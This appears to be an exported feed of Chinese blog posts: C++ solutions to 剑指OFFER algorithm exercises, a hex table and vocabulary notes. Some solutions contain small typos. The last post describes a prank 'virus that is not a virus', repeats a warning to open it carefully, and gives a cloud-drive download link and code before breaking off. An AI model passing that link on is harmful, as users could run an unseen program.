 &#x2F; \
1   3
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">&#x2F;**
 * Definition for a binary tree node.
 * struct TreeNode &#123;
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode *father;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL), father(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution
&#123;
public:
    TreeNode *inorderSuccessor(TreeNode *p)
    &#123;
        if (p-&gt;right)
        &#123;
            p &#x3D; p-&gt;right;
            while (p-&gt;left)
                p &#x3D; p-&gt;left;
            return p;
        &#125;
        while (p-&gt;father &amp;&amp; p &#x3D;&#x3D; p-&gt;father-&gt;right)
            p &#x3D; p-&gt;father;

        return p-&gt;father;
    &#125;
&#125;;s
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 6.重建二叉树</title>
    <url>/2021/03/12/%E5%89%91%E6%8C%87OFFER-6-%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<p>重建二叉树</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">输入一棵二叉树前序遍历和中序遍历的结果，请重建该二叉树。

注意:

二叉树中每个节点的值都互不相同；
输入的前序遍历和中序遍历一定合法；
样例
给定：
前序遍历是：[3, 9, 20, 15, 7]
中序遍历是：[9, 3, 15, 20, 7]

返回：[3, 9, 20, null, null, 15, 7, null, null, null, null]
返回的二叉树如下所示：
    3
   &#x2F; \
  9  20
    &#x2F;  \
   15   7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
        map&lt;int,int&gt; hash;
        vector&lt;int&gt; preorder,inorder;
        TreeNode* buildTree(vector&lt;int&gt;&amp; _preorder, vector&lt;int&gt;&amp; _inorder) 
        &#123;
            preorder&#x3D;_preorder,inorder&#x3D;_inorder;
            for(int i&#x3D;0;i&lt;inorder.size();i++)
            &#123;
                hash[inorder[i]]&#x3D;i;
            &#125;
            return dfs(0,preorder.size()-1,0,preorder.size()-1);
        &#125;    
        TreeNode * dfs(int pl,int pr,int il,int ir)
        &#123;
            if(pl&gt;pr)
                return nullptr;
                auto root&#x3D;new TreeNode(preorder[pl]);
                int k&#x3D;hash[root-&gt;val];
                auto left&#x3D;dfs(pl+1,pl+k-il,il,k-1);
                auto right&#x3D;dfs(pl+k-il+1,pr,k+1,ir);
                root-&gt;left&#x3D;left,root-&gt;right&#x3D;right;
                return root;
                
        &#125;
        
        
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 5. 从尾到头打印链表</title>
    <url>/2021/03/10/%E5%89%91%E6%8C%87OFFER-5-%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<p>从尾到头打印链表</p>
<a id="more"></a>


<pre class="line-numbers language-none"><code class="language-none">输入一个链表的头结点，按照 从尾到头 的顺序返回节点的值。

返回的结果用数组存储。

样例
输入：[2, 3, 5]
返回：[5, 3, 2]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#x2F;**
 * Definition for singly-linked list.
 * struct ListNode &#123;
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    vector&lt;int&gt; printListReversingly(ListNode* head) &#123;
        vector&lt;int&gt; n;
        while(head)
        &#123;
            n.push_back(head-&gt;val);
            head&#x3D;head-&gt;next;
        &#125;
        return vector&lt;int&gt;(n.rbegin(),n.rend());
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 4.替换空格</title>
    <url>/2021/03/10/%E5%89%91%E6%8C%87OFFER-4-%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/</url>
    <content><![CDATA[<p>替换空格</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">请实现一个函数，把字符串中的每个空格替换成&quot;%20&quot;。

你可以假定输入字符串的长度最大是 1000。

注意输出字符串的长度可能大于 1000。

样例
输入：&quot;We are happy.&quot;

输出：&quot;We%20are%20happy.&quot;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    string replaceSpaces(string &amp;str) &#123;
        string n;
        for(auto x:str)
            if(x&#x3D;&#x3D;&#39; &#39;)
                n+&#x3D;&quot;%20&quot;;
            else
                n+&#x3D;x;
        return n;
    &#125;
&#125;;


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 3.二维数组中的查找</title>
    <url>/2021/03/10/%E5%89%91%E6%8C%87OFFER-3-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p>二维数组中的查找</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。

请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。

样例
输入数组：

[
  [1,2,8,9]，
  [2,4,9,12]，
  [4,7,10,13]，
  [6,8,11,15]
]

如果输入查找数值为7，则返回true，

如果输入查找数值为5，则返回false。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">class Solution &#123;
public:
    bool searchArray(vector&lt;vector&lt;int&gt;&gt; array, int target) &#123;
        if(array.empty()||array[0].empty())
            return false;
        int i&#x3D;0;
        int j&#x3D;array[0].size()-1;
        while(i&lt;array.size()&amp;&amp;j&gt;&#x3D;0)
        &#123;
            if(array[i][j]&#x3D;&#x3D;target)
                return array[i][j];
            if(array[i][j]&gt;target)
                j--;
            else i++;
        &#125;
        return false;
    &#125;
&#125;;
剑指OFFER 3.二维数组中的查找
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 2.不修改数组找出重复的数字</title>
    <url>/2021/03/10/%E5%89%91%E6%8C%87OFFER-2-%E4%B8%8D%E4%BF%AE%E6%94%B9%E6%95%B0%E7%BB%84%E6%89%BE%E5%87%BA%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<p>不修改数组找出重复的数字</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">给定一个长度为 n+1 的数组nums，数组中所有的数均在 1∼n 的范围内，其中 n≥1。

请找出数组中任意一个重复的数，但不能修改输入的数组。

样例
给定 nums &#x3D; [2, 3, 5, 4, 3, 2, 6, 7]。

返回 2 或 3。
思考题：如果只能使用 O(1) 的额外空间，该怎么做呢？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">
class Solution &#123;
public:
    int duplicateInArray(vector&lt;int&gt;&amp; nums) 
    &#123;
        int l&#x3D;1,r&#x3D;nums.size()-1;
        while(l&lt;r)
        &#123;
            int mid&#x3D;l+r&gt;&gt;1;
            int s&#x3D;0;
            for(auto x:nums)
                s&#x3D;(x&gt;&#x3D;l&amp;&amp;x&lt;&#x3D;mid)+s;
            
            if(s&gt;mid-l+1)
                    r&#x3D;mid;
                else l&#x3D;mid+1;
        &#125;
        return r(r or l都可以);
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>16进制的快速转换</title>
    <url>/2021/03/09/16%E8%BF%9B%E5%88%B6%E7%9A%84%E5%BF%AB%E9%80%9F%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<p>16进制的快速转换</p>
<a id="more"></a>

<pre class="line-numbers language-none"><code class="language-none">A       10
B       11
C       12
D       13
E       14
F       15
1*16    16
2*16    32
3*16    48
4*16    64
5*16    80
6*16    96
7*16    112
8*16    128
9*16    144
10*16   160
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Words Day6,7</title>
    <url>/2021/03/09/Words-Day1/</url>
    <content><![CDATA[<p>Words Day6,7</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">english 
day6



1. enable  
	en--&gt;使动
	e_ ex......辅(除了en)&#x3D;&#x3D;out
2. disable   v. 使无能，使残疾，使无效  
	disable sb from doing 
	dis--&gt;分散，否定
3. abolish   v.  废除,取消
	ab&#x3D;&#x3D;否
   a辅(除ab)&#x3D;&#x3D;to
4. absurd   a. 荒谬的，不合理的
	surd--&gt;sound(合理的，声音)
5. abuse   v.滥用,辱骂，虐待
	drug abuse  药物滥用
	child abuse 虐待儿童
6. mistreat   v.虐待
	treat--&gt;对待，款待,治疗
	eat--&gt;吃
	It&#39;s my treat today
7. SM--&gt;sexual mistreat 
8. academy--&gt;学院
9. academic   a.学术的，学院的，大学教授
10. scholar   n.学者
11. act&#x3D;&#x3D;ag--&gt;行动，作用
12. activate  v.使活动，使行动，刺激，激活
13. activity   n. 
14. react   v. 反应，反作用
	re--&gt;back,return 
	react +to 
15. reaction   n.
16. exact    a.真实的,精确的，准确的
	ex--&gt;out
17. exactly ad.精确地,恰恰
18. interact 	v.相互作用，相互影响
	inter--&gt;middle,between
	interview	v.面试，采访
19. sur--&gt;up
	surpass	v.超过
	idiot  	n.笨蛋
20.	trans&#x3D;across  穿越，穿梭
	transaction		n.处理，办理，！交易
21.	transform	v.改变
	form--&gt;形式
	transformer	n.变压器
	transport	v.运输
	port	n.港口
	pot	n.壶
	hot-pot	火锅
	transplant	v.移植，移居
22.	agent	n.代理人,代理商  a.代理的
	ag--&gt;act
	ent--&gt;sb,的
	agency	n.代理处，中介
23.	agenda	n.行程，日程，！目的
	da--&gt;day
24.	rely   v.依赖
25.	very--&gt;正是，恰恰是
26.	lure	v.诱惑   n.诱饵
27.	wallet	n.钱包
28.	acu&#x3D;&#x3D;acr&#x3D;&#x3D;sharp  尖
	acute	a.尖的，敏锐，急性的,！严重的，！强烈的
	vivid	a.鲜明，生动
	viv--&gt;live
	mass--&gt;大量的
29.	massacre	v.屠杀，残杀
30.	aer&#x3D;&#x3D;air&#x3D;&#x3D;air 空气，天空
aerial	n.空中的，航空的
31.	alter	v.改变，更改,改动
32.	alternate	v.(次序顺序)改变
				a.交替，轮流
	alter
	ate--&gt;n.v.a
33.	alternative	A.两者择其一的，备选的
	n.可供选择的事物
34.	conventional	a.传统的

day7
1.	anci&#x3D;&#x3D;ance--&gt;before 古代，以前
2.	ancient	a.	古代的，古老的
3.	ancestor	n.祖先，先驱
	st&#x3D;&#x3D;sist&#x3D;&#x3D;stitute
4.	ann&#x3D;&#x3D;enn&#x3D;&#x3D;year
	anniversary	n.	周年纪念日
	ver&#x3D;&#x3D;vers&#x3D;&#x3D;vert--&gt;转,(震动声,拟声词)转变
5.	annual 	a.每年的 	n.年刊

	mill--&gt;milli--&gt;千
6.	millennial	n.千禧一代	a.一千年的
7.	millimeter	n.厘米
	auct--&gt;aug&#x3D;&#x3D;大
8.	Julius	Caesar	凯撒---&gt;July
9.	Augustus	屋大维,奥古斯都(神)
	--&gt;August
10.	sept--&gt;7
11.	Oct--&gt;8
12.	December--&gt;10
12.	decade	n.十年
13.	decimeter	n.分米
14.	auction		n.v.拍卖（会）
	auct--&gt;大
15.augment	n.v.增大，增加
	aud--&gt;audi--&gt;hear听,声音(奥迪)
16.	audio	n.音频	a.声音的,音频的
17.	audidence	n.听众
18.	audit	v.n.旁听,审计
19.	auditing	n.审计学
	ing--&gt;n.a&#x2F;prep&#x2F;学科
	logy--&gt;学科
	ics--&gt;学科
20.	aural	a.听力的，听觉的
	ear--&gt;aur
21.	oral	a.口头的
	o+r--&gt;speck&#x3D;&#x3D;嘴,人
22.	oration		n.演讲,演说
23.	orator	n.演讲者
24.	auth--&gt;作者,权威
25.	author		n.作者,著作者
26.	authority	n.权威,权力,官方，当局
27.	the authority&#x3D;&#x3D;government
28.	ize&#x3D;&#x3D;ify--&gt;动词，使动
29.	authorize	v.授权,批准‘
30.	su--&gt;上下
	suspect--&gt;嫌疑人
31.	content	n.内容
			a.满意的
32.	authentic	a.真的，真正的，可信的
	en--&gt;a.
	tic--&gt;a.
	非成组词(A字母)
33.	abandon	v.放弃
34.	ban	n.禁令，v.禁止
35.	banner	n.双杆旗，横幅
	slongan	n.标语，口号
	flag	n.单杆旗
36.	flagrant	a.臭名昭著的
	ant--&gt;a.
37.	accompany	v.陪伴
	ac--&gt;to
	company	n.公司，陪伴，伴随
38.	accuse	v.指责，控告
	ac--&gt;to
	cu--&gt;哭
	se--&gt;死
39.	accustomed
40.	custom	n.习惯，习俗
	customer	n.顾客
	customs	n.海关
41.	accustomed	a.习惯的，适应的
	ac--&gt;to
	ed--&gt;的
42.	acquaintance	n.熟人,相识
	ac--&gt;to
	qu--&gt;去
	ai--&gt;爱
43.	acquaintance	v.使熟悉
44.	address		n.地址	
	v.解决，表达，演讲
45.	agony	n.(精神或肉体的)极大痛苦,创伤
	爱过你,爱割你
46.	alarm	n.惊恐，报警		v.惊吓，向。。。。报警
47.	alert  	n.机警的,警觉的	v.使。。。。。。警觉
48.	firealarm  n. 火警警报
49.	ample	a.充分的，富裕的，宽敞的，广大的
50.	amplify	v.放大，扩大
51.	amuse 	v.使娱乐，使消遣
	--&gt;recreate	v.
	--&gt;entertain	v.
52.	musemn.	博物馆
53.	amusing	a.有趣的
54.	amaze	v.使惊奇
55.	anguish	n.极度痛苦，烦恼
	--&gt;angry--&gt;angu
	俺跪si
56.	annoy	v.打扰,使烦恼
	an--&gt;to
	noy--&gt;noise
57.	poli--&gt;政治
	policymaker
58.	appear	v.出现
	apparent	a.出现的，表面的，明显的
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 1.二维数组中的查找</title>
    <url>/2021/03/08/%E5%89%91%E6%8C%87OFFER-1-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p>二维数组中的查找</p>
<a id="more"></a>
<blockquote>
<ul>
<li>在一个长度为n的数组里的所有数字都在0到n-1的范围内。 数组中某些数字是重复的，但不知道有几个数字是重复的。也不知道每个数字重复几次。请找出数组中第一个重复的数字。 例如，如果输入长度为7的数组[2,3,1,0,2,5,3]，那么对应的输出是第一个重复的数字2。没有重复的数字返回-1。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>输入<br>[2,3,1,0,2,5,3]</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>返回值<br>2</li>
</ul>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">书上答案为错，6320250,需要返回2，实际返回0
int duplicate(vector&lt;int&gt;&amp; numbers) &#123;
        &#x2F;&#x2F; write code here
        int len&#x3D;numbers.size();
        for(int i&#x3D;0;i&lt;len;i++)
        &#123;
            while(numbers[i]!&#x3D;i)
            &#123;
                if(numbers[i]&#x3D;&#x3D;numbers[numbers[i]])
                   return numbers[i];
                int t&#x3D;numbers[i];
                numbers[i]&#x3D;numbers[t];
                numbers[t]&#x3D;t;
            &#125;
        &#125;
        return -1;
    &#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">大雪菜的也一样
class Solution &#123;
public:
    &#x2F;**
     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可
     *
     * 
     * @param numbers int整型vector 
     * @return int整型
     *&#x2F;
    int duplicate(vector&lt;int&gt;&amp; nums) &#123;
       int n&#x3D;nums.size();
        for(auto x:nums)
        	if(x&lt;0||x&gt;&#x3D;n)
        		return -1;
        for(int i&#x3D;0;i&lt;n;i++)
        &#123;
        	while(nums[i]!&#x3D;i&amp;&amp;nums[nums[i]]!&#x3D;nums[i])
        		swap(nums[i],nums[nums[i]]);
        	if(nums[i]!&#x3D;i &amp;&amp;nums[i]&#x3D;&#x3D;nums[nums[i]])
        		return nums[i];
        &#125;
        return -1;
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">个人完美答案
int duplicate(vector&lt;int&gt;&amp; numbers) &#123;
        int length&#x3D;numbers.size();
         for (int i &#x3D; 0; i &lt; length; i++)
        &#123;

            int index &#x3D; numbers[i];
            if (index &gt;&#x3D; length)
            &#123;
                index -&#x3D; length;
            &#125;
            if (numbers[index] &gt;&#x3D; length)
            &#123;
                return index;
            &#125;

            numbers[index] &#x3D; numbers[index] + length;
        &#125;

        return -1;
    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




<pre class="line-numbers language-none"><code class="language-none">class Solution 
&#123;
public:
    bool duplicate(int numbers[], int length, int* duplication) 
    &#123;
        if(numbers&#x3D;&#x3D;nullptr||length&lt;&#x3D;0)
        &#123;
            return false;
        &#125;        
        for(int i&#x3D;0;i&lt;length;i++)
        &#123;
            if(numbers[i]&lt;0||numbers[i]&gt;length-1)
                return false;
        &#125;
        for(int i&#x3D;0;i&lt;length;i++)
        &#123;
            while(numbers[i]!&#x3D;i)
            &#123;
                if(numbers[i]&#x3D;&#x3D;numbers[numbers[i]])
                &#123;
                    *duplication&#x3D;numbers[i];
                    return true;
                &#125;
                int t&#x3D;numbers[i];
                numbers[i]&#x3D;numbers[t];
                numbers[t]&#x3D;t;
            &#125;
        &#125;
        return false;
    &#125;
&#125;;


class Solution &#123;
public:
    &#x2F;&#x2F; Parameters:
    &#x2F;&#x2F;        numbers:     an array of integers
    &#x2F;&#x2F;        length:      the length of array numbers
    &#x2F;&#x2F;        duplication: (Output) the duplicated number in the array number
    &#x2F;&#x2F; Return value:       true if the input is valid, and there are some duplications in the array number
    &#x2F;&#x2F;                     otherwise false
    bool duplicate(int numbers[], int length, int* duplication) &#123;
        vector&lt;bool&gt; f(length, false);
        for (int i&#x3D;0; i&lt;length; ++i) &#123;
            if (!f[numbers[i]]) &#123;
                f[numbers[i]] &#x3D; true;
            &#125;
            else &#123;
                *duplication &#x3D; numbers[i];
                return true;
            &#125;
        &#125;
        return false;
    &#125;
&#125;;



class Solution &#123;
public:
    &#x2F;&#x2F; Parameters:
    &#x2F;&#x2F;        numbers:     an array of integers
    &#x2F;&#x2F;        length:      the length of array numbers
    &#x2F;&#x2F;        duplication: (Output) the duplicated number in the array number
    &#x2F;&#x2F; Return value:       true if the input is valid, and there are some duplications in the array number
    &#x2F;&#x2F;                     otherwise false
    bool duplicate(int numbers[], int length, int* duplication) 
    &#123;
        vector&lt;bool&gt; flag(length,false);
        for(int i&#x3D;0;i&lt;length;i++)
        &#123;
            if(flag[numbers[i]]&#x3D;&#x3D;true)
            &#123;
                *duplication&#x3D;numbers[i];
                return true;
            &#125;
                
            else flag[numbers[i]]&#x3D;true;
        &#125;
        return false;
    &#125;
    &#125;;




class Solution &#123;
public:

    bool duplicate(int numbers[], int length, int* duplication) &#123;
   if (length &lt;&#x3D; 0 || numbers &#x3D;&#x3D; nullptr) &#123;
          return false;
      &#125;
 
      for (int i &#x3D; 0; i &lt; length; i++) &#123;
          int index &#x3D; numbers[i];
          if (index &gt;&#x3D; length) &#123;
              index -&#x3D; length;
          &#125;
          if (numbers[index] &gt;&#x3D; length) &#123;
              duplication[0] &#x3D; index;
              return true;
          &#125;
          numbers[index] +&#x3D; length;
 
      &#125;
      return false;
  &#125;
&#125;;



class Solution &#123;
public:
    &#x2F;&#x2F; Parameters:
    &#x2F;&#x2F;        numbers:     an array of integers
    &#x2F;&#x2F;        length:      the length of array numbers
    &#x2F;&#x2F;        duplication: (Output) the duplicated number in the array number
    &#x2F;&#x2F; Return value:       true if the input is valid, and there are some duplications in the array number
    &#x2F;&#x2F;                     otherwise false
    bool duplicate(int numbers[], int length, int* duplication) &#123;
        set&lt;int&gt; s;
        bool flag &#x3D; false ;
        for(int i&#x3D;0;i&lt;length;i++)&#123;
            int siz1 &#x3D; s.size();
            s.insert(numbers[i]);
            int siz2 &#x3D; s.size();
            if(siz1 &#x3D;&#x3D; siz2)&#123;
                duplication[0] &#x3D; numbers[i];
                flag &#x3D; true;
                break ;
            &#125;
        &#125;
        return flag ;
    &#125;
&#125;;









class Solution
&#123;
public:
    bool duplicate(int numbers[], int length, int *duplication)
    &#123;
        for(int i&#x3D;0;i&lt;length-1;i++)
        &#123;
            for(int j&#x3D;i+1;j&lt;length;j++)
            &#123;
                if(numbers[i]&#x3D;&#x3D;numbers[j])
                &#123;
                    *duplication&#x3D;numbers[i];
                    return true;
                &#125;
            &#125;
        &#125;
        return false;
        
    &#125;
&#125;;







#include &lt;stdio.h&gt;
#include &lt;iostream&gt;
using namespace std;

int countRange(const int *numbers, int length, int start, int end)
&#123;
    if (numbers &#x3D;&#x3D; NULL)
        return 0;
    int count &#x3D; 0;
    for (int i &#x3D; 0; i &lt; length; i++)
    &#123;
        if (numbers[i] &gt;&#x3D; start &amp;&amp; numbers[i] &lt;&#x3D; end)
        &#123;
            ++count;
        &#125;
    &#125;
    return count;
&#125;
int getDuplication(const int *numbers, int length)
&#123;
    if (length &lt;&#x3D; 0)
        return -1;
    int start &#x3D; 1;
    int end &#x3D; length - 1;
    while (end &gt;&#x3D; start)
    &#123;
        int middle &#x3D; (start + end) &#x2F; 2;
        int count &#x3D; countRange(numbers, length, start, middle);
        if (end &#x3D;&#x3D; start)
        &#123;
            if (count &gt; 1)
                return start;
            else
                break;
        &#125;
        if (count &gt; (middle - start + 1))
            end &#x3D; middle;
        else
            start &#x3D; middle + 1;
    &#125;
    return -1;
&#125;
int main()
&#123;
    int a[10] &#x3D; &#123;2, 3, 5, 4, 3, 2, 6, 7&#125;;
    cout &lt;&lt; getDuplication(a, 8);
&#125;



#include &lt;stdio.h&gt;
#include &lt;iostream&gt;
using namespace std;
int getDuplication(const int *numbers, int length)
&#123;
    if (length &lt;&#x3D; 0)
        return -1;
    int start &#x3D; 1;
    int end &#x3D; length - 1;
    while (end &gt;&#x3D; start)
    &#123;
        int middle &#x3D; (start + end) &#x2F; 2;
        int count &#x3D; 0;
        for(int j&#x3D;0;j&lt;length;j++)
        &#123;
            if(numbers[j]&gt;&#x3D;start&amp;&amp;numbers[j]&lt;&#x3D;middle)
                count++;
        &#125;
        if (end &#x3D;&#x3D; start)
        &#123;
            if (count &gt; 1)
                return start;
            else
                break;
        &#125;
        if (count &gt; (middle - start + 1))
            end &#x3D; middle;
        else
            start &#x3D; middle + 1;
    &#125;
    return -1;
&#125;
int main()
&#123;
    int a[8] &#x3D; &#123;2, 3, 5, 4, 3, 2, 6, 7&#125;;
    cout &lt;&lt;  getDuplication(a,8);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>与刚哥的中路对狙(不是病毒的病毒)</title>
    <url>/2021/03/08/%E4%B8%8E%E5%88%9A%E5%93%A5%E7%9A%84%E4%B8%AD%E8%B7%AF%E5%AF%B9%E7%8B%99-%E4%B8%8D%E6%98%AF%E7%97%85%E6%AF%92%E7%9A%84%E7%97%85%E6%AF%92/</url>
    <content><![CDATA[<blockquote>
<p>文艺复兴</p>
</blockquote>
<a id="more"></a>
<p>源码地址：<br>谨慎打开！！！<br>谨慎打开！！！<br>谨慎打开！！！<br>链接：<a href="https://pan.baidu.com/s/1NMsq9RmxSfTZ72csfA_0Iw">https://pan.baidu.com/s/1NMsq9RmxSfTZ72csfA_0Iw</a><br>提取码：l3o4</p>
<pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;
